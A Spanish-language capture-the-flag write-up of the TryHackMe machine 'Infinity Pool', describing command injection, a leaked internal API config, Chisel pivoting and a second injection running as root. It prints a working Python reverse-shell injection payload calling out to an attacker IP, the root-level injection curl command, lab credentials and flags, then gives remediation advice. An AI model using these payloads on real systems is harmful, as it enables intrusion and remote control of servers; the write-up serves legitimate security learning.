Infinity Pool — de Command Injection a root vía una API interna

Fecha: 11 ago 2026 Dificultad: Media Categoría: Command Injection / Pivoting Sistema: Linux (tryhackme-2404) Plataforma: TryHackMe

Resumen

La máquina se resolvió mediante una cadena de vulnerabilidades que comenzó con una inyección de comandos en una funcionalidad interna de comprobación de conectividad, lo que permitió obtener ejecución remota de comandos como el usuario web. La enumeración posterior de servicios internos reveló una API de Watchtower que filtraba credenciales de FreePBX sin ningún tipo de restricción de acceso. Dichas credenciales permitieron entrar al portal UCP y recuperar una Automation Key, utilizada después contra un servicio interno de automatización que se ejecutaba como root — y que resultó ser vulnerable al mismo tipo de fallo que había abierto la puerta de entrada.

User flag: THM{n0_v1s1bl3_3dg3} · Root flag: THM{tr4c3d_t0_th3_h0r1z0n}

Artefactos y herramientas

  • nmap / gobuster — reconocimiento de puertos y rutas
  • Shell reversa en Python — RCE inicial vía command injection
  • Chisel — pivoting de un servicio interno en localhost:9000 hacia Kali
  • curl — interacción manual con las APIs internas (Watchtower y Automation Service)

Análisis

1. Reconocimiento inicial

Objetivo: identificar la superficie de ataque expuesta.

El escaneo de puertos únicamente devolvió el servicio HTTP estándar expuesto:

80/tcp open http

Superficie de ataque mínima a nivel de red: toda la enumeración posterior tuvo que apoyarse en el puerto 80. El fuzzing de rutas sobre el servicio web sacó a la luz una funcionalidad interna no listada en ningún menú visible:

/internal/netcheck

Este endpoint acabaría siendo el punto de entrada inicial a la máquina.

2. Explotación inicial: Command Injection

Objetivo: conseguir ejecución de comandos a partir del checker de conectividad.

El endpoint /internal/netcheck aceptaba un parámetro host que se pasaba, sin validar, a un comando del sistema. Esto permitió inyectar y ejecutar comandos arbitrarios en el servidor.

# Listener en Kali
nc -lvnp 4444
# Payload de inyección
curl -X POST -d "host=127.0.0.1; python3 -c 'import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((\"192.168.142.180\",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn(\"/bin/bash\")'" \
http://10.112.135.22/internal/netcheck

Resultado: shell reversa confirmando ejecución de comandos como web@tryhackme-2404.

3. Enumeración interna

Objetivo: descubrir servicios internos no accesibles desde el exterior.

Con acceso al sistema, la revisión de procesos y sockets locales reveló varios servicios internos escuchando únicamente en 127.0.0.1, invisibles desde el exterior:

DirecciónServicio
127.0.0.1:3000watchtower
127.0.0.1:8080FreePBX
127.0.0.1:8088Asterisk HTTP
127.0.0.1:8089Asterisk HTTPS
127.0.0.1:9000automation
127.0.0.1:5038AMI

User flag: THM{n0_v1s1bl3_3dg3} — ya accesible en esta fase.

4. Watchtower: la API que hablaba de más

Objetivo: explotar la falta de autenticación de la API interna de Watchtower.

El servicio Watchtower, en el puerto 3000, exponía una API interna sin autenticación.

curl http://127.0.0.1:3000/api/health
curl http://127.0.0.1:3000/api/config

Respuesta del servidor:

{
  "automation_endpoint":"http://127.0.0.1:9000",
  "telephony_user":"FreePBXUCPTemplateCreator",
  "telephony_pass":"St4yN0t1c3d_2026",
  "telephony_portal":"http://127.0.0.1:8080/ucp"
}

El propio endpoint de configuración devolvía credenciales de FreePBX en texto plano — un fallo de exposición de información que se convirtió en el siguiente eslabón de la cadena.

5. Acceso a FreePBX / UCP

Objetivo: usar las credenciales filtradas para entrar al portal de usuario.
http://127.0.0.1:8080/ucp

Usuario:  FreePBXUCPTemplateCreator
Password: St4yN0t1c3d_2026

Ya autenticados en el UCP, se localizó una Automation Key reservada para integraciones automatizadas del sistema:

cc_auto_7b3f9a1c4e0d2f6a

Esta clave estaba directamente asociada al servicio interno de automatización detectado antes en la enumeración de puertos (http://127.0.0.1:9000).

6. Pivoting con Chisel

Objetivo: alcanzar el servicio de automatización, limitado a localhost en la víctima.

Como el servicio de automatización solo escuchaba en localhost, fue necesario tunelizar el puerto 9000 hacia Kali para poder interactuar con él cómodamente.

# Kali (servidor)
./chisel server --reverse -p 9999

# Víctima (cliente)
./chisel client 192.168.142.180:9999 \
  R:9000:127.0.0.1:9000

Con el túnel establecido, el servicio interno quedó accesible localmente desde Kali como si corriera en la propia máquina atacante.

7. Automation Service: ejecución como root

Objetivo: entender qué expone el servicio de automatización y cómo autenticarse.
curl http://127.0.0.1:9000/health
{
  "service":"automation",
  "status":"ok",
  "runs_as":"root",
  "endpoints":{
    "GET /health":"service status",
    "POST /jobs/export":{
      "auth":"Authorization: Bearer ",
      "body":{"report":""}
    }
  }
}

Esta única respuesta reveló, de golpe, todo lo necesario para la escalada final: el servicio se ejecutaba como root, existía un endpoint privilegiado de exportación (POST /jobs/export), y la autenticación se realizaba mediante un simple token Bearer — precisamente la Automation Key recuperada del UCP.

8. Escalada de privilegios: Command Injection (otra vez) como root

Objetivo: conseguir ejecución como root a través del endpoint de exportación.

El parámetro report del endpoint de exportación terminaba siendo concatenado en un comando del sistema basado en tar, sin sanitizar — el mismo patrón de inyección que ya había funcionado en /internal/netcheck, esta vez con permisos de root.

curl -X POST "http://127.0.0.1:9000/jobs/export" \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"flagita.tgz/var/automation/data ; cat /root/root.txt "}'

Respuesta del servicio:

{"command":"tar czf /var/automation/exports/flagita.tgz/var/automation/data ; cat /root/root.txt .tgz /var/automation/data 2>&1","output":"THM{tr4c3d_t0_th3_h0r1z0n}\ncat: .tgz: No such file or directory\ncat: /var/automation/data: Is a directory\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\n"}

Root flag: THM{tr4c3d_t0_th3_h0r1z0n}

Cadena de ataque (kill chain)

#Paso
1Nmap → puerto 80 expuesto
2Gobuster → descubrimiento de /internal/netcheck
3Command injection en el parámetro host
4Reverse shell → acceso como web
5Watchtower /api/config filtra credenciales de FreePBX
6Acceso al UCP con las credenciales filtradas
7Recuperación de la Automation Key en el UCP
8Pivoting con Chisel hacia el puerto 9000 (automation, corre como root)
9Automation API: endpoint privilegiado autenticado por Bearer token
10Command injection en /jobs/export → root.txt

Conclusiones

La máquina repite, a dos niveles distintos de privilegio, el mismo fallo de fondo: un parámetro controlado por el usuario que se concatena directamente en un comando del sistema sin sanitizar. A eso se suma una API interna sin autenticación que filtra credenciales en texto plano, confiando únicamente en que 127.0.0.1 es "zona segura" — una suposición que deja de ser cierta en cuanto el atacante ya tiene ejecución de comandos en la máquina. Las medidas clave de remediación serían: nunca construir comandos de sistema a partir de entrada de usuario (usar APIs nativas del lenguaje o listas blancas estrictas en su lugar), no exponer configuración ni credenciales sin autenticación aunque el servicio esté limitado a localhost, y aplicar el mismo rigor de validación a los servicios internos que a los expuestos públicamente, ya que cualquier RCE inicial los convierte en parte de la superficie de ataque real.
